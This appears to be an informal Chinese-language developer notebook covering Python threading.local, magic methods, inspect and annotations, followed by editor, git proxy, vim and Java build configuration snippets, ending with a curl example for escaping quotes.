    local = threading.local()
    local.t = "main"
    print(type(local))


    def func(info):
        print('Has t in new thread: %s' % hasattr(local, 't'))
        local.t = info
        print('Has t in new thread: %s' % hasattr(local, 't'))
        print(local.t)

    t1 = threading.Thread(target=func, args=['funcA'])
    t2 = threading.Thread(target=func, args=['funcB'])

    t1.start()
    t1.join()

    t2.start()
    t2.join()

    print(local.t)

}

python类常用的内置方法{
#更好的总结在下面的链接中:)
https://github.com/lgjabc/python_learn/blob/master/%E6%A0%B7%E4%BE%8B/Example3_python/%E7%B1%BB%E7%9A%84%E5%86%85%E7%BD%AE%E6%96%B9%E6%B3%95%E8%BF%9B%E9%98%B6.sh

#内置方法	 说明
__init__(self,   )	 初始化对象,在创建新对象时调用
__del__(self)	 释放对象,在对象被删除之前调用
__new__(cls,*args,**kwd)	 实例的生成操作
__str__(self)	 在使用print语句时被调用
__getitem__(self,key)	 获取序列的索引key对应的值,等价于seq[key]
__len__(self)	 在调用内联函数len()时被调用
__cmp__(stc,dst)	 比较两个对象src和dst
__getattr__(s,)	 获取属性的值
__setattr__(s,,value)	 设置属性的值
__delattr__(s,)	 删除属性
__getattribute__()	 __getattribute__()功能与__getattr__()类似
__gt__(self,other)	 判断self对象是否大于other对象
__lt__(self,other)	 判断self对象是否小于other对象
__ge__(self,other)	 判断self对象是否大于或者等于other对象
__le__(self,other)	 判断self对象是否小于或者等于other对象
__eq__(self,other)	 判断self对象是否等于other对象
__call__(self,*args)	 把实例对象作为函数调用
}

python 反射/自省 inspect{
#http://www.cnblogs.com/huxi/archive/2011/01/02/1924317.html
#http://www.cnblogs.com/xiami303/archive/2012/05/31/2528799.html
使用import inspect 查看python 类的参数和模块、函数代码
查看全部代码 inspect.getsource(模块.函数）或者（模块.类.函数）
查看函数参数 inspect.getargspec(   )   查看类的参数,则括号里为（模块.类.__init__）
查看函数的位置 inspect.getabsfile(   ) 
getargvalues(frame): 仅用于栈帧,获取栈帧中保存的该次函数调用的参数值,返回元组,分别是(普通参数名的列表, *参数名, **参数名, 帧的locals())。
getcallargs(func[, *args][, **kwds]): 返回使用args和kwds调用该方法时各参数对应的值的字典。
}

python3函数注解{
>>> def func(a:"sp",b:(1,20),c:float)-> int:
		return a+b+c

>>> func.__annotations__
{'a': 'sp', 'b': (1, 20), 'c': <class 'float'>, 'return': <class 'int'>}
>>> func.__annotations__.get('a')
'sp'
}
}

一些环境配置方法记录{
notepad++配置运行python{

cmd /k cd "$(CURRENT_DIRECTORY)" &  python "$(FULL_CURRENT_PATH)" & ECHO. & PAUSE & EXIT
然后点击"保存",随意取一个名字,比如"RunPython",为方便,配置一下快捷键(比如 Ctrl + F5),点OK即可。
之后运行Python文件只要按配置的快捷键或者在运行菜单上点"RunPython"即可。
}

sublime user配置package control配置{
#解决安装包插件自动消失
{
	"auto_upgrade": false,
	"bootstrapped": true,
	"install_missing": false,
	"installed_packages":
	[
		"Package Control"
	],
	"remove_orphaned": false
}
}

代理中有特殊字符{
git config http.proxy http://user:password@127.0.0.1:8088,就会存在2个@,密码例如aa@bb
git config http.proxy http://user:aa%40bb@proxy.qq.com:8080
通常的编码方法：
1)按照某个编码集(例如utf-8,GB2312等)转化为16进制；
2)在每个16进制的字节前,加上一个%；
例子：汉字"节"的GB2312编码是"BD DA",转成URL编码为"%BD%DA"
}

Sublime Text 3 配置Java开发{
http://www.cnblogs.com/final/p/5348350.html

内嵌模式
在Sublime内部输出面板显示执行过程

配置JavaC - INSET.sublime-build

打开Sublime的包目录(选择菜单：Perferences > Browse Packages),进入User文件夹,
新建文件JavaC - INSET.sublime-build：

{
    "cmd": ["C:/Users/AA/AppData/Roaming/Sublime Text 3/Packages/User/JavaC - INSET.cmd", "$file"],
    "file_regex": "^(   *?):([0-9]*):?([0-9]*)",
    "selector": "source.java",
    "shell": true,
    // Windows 中文版支持的编码格式是GBK,这条配置是通知Sublime Text 2以系统环境的编码格式输出,如果不加这一条配置,在编译运行时就会提示Decode error - output not utf-8错误
    "encoding":"GBK"
}
配置JavaC - INSET.cmd

在User文件夹(C:/Users/final/AppData/Roaming/Sublime Text 3/Packages/User/)
新建JavaC - INSET.cmd：

@ECHO OFF
cd %~dp1
ECHO Compiling %~nx1   
IF EXIST %~n1.class (
    DEL %~n1.class
)

rem javac %~nx1
rem javac -encoding GBK %~nx1
rem javac -encoding UTF-8 -d . %~nx1
javac -encoding GBK -d . %~nx1
IF EXIST %~n1.class (
    ECHO ^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>
    rem ECHO.
    java %~n1
    rem ECHO.
    ECHO ^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>^>
)

}

通用技能{

#http://www.cnblogs.com/tianyajuanke/archive/2012/04/25/2470002.html
vi ~/.bashrc
alias vi='vim'

#显示行号的配置
vim ~/.vimrc
syntax on
set nu!

echo -e 'syntax on\nset nu!' >> ~/.vimrc


vim ~/.vimrc #进入配置文件

如果不知道vimrc文件在哪，可使用 :scriptnames 来查看
set nu　　　　　　#行号
set tabstop=4　　#一个tab为4个空格长度
set ai  #设置自动缩进
syntax on   #高亮

#查看和切换分支
git branch --all
git checkout hw/mitaka

autopep8
C:\Python36-32\Scripts\autopep8.exe
-i $FilePath$
$ProjectFileDir$

flake8
C:\Python36-32\Scripts\flake8.exe
$FilePath$
$ProjectFileDir$

}

引号和单引号的转义{
curl = u'curl -i -k -X POST https://cps.localdomain.com:8008/cps/v1/ha_swap_switch -H "Content-Type:application/json" -H "X-Auth-User:cps_admin" -H "X-Auth-Password:FusionSphere123" -d "{\\"data\\": [{\\"service\\": \\"gaussdb\\", \\"template\\": \\"gaussdb\\", \\"switch\\": \\"disabled\\"}]}"'
}

}



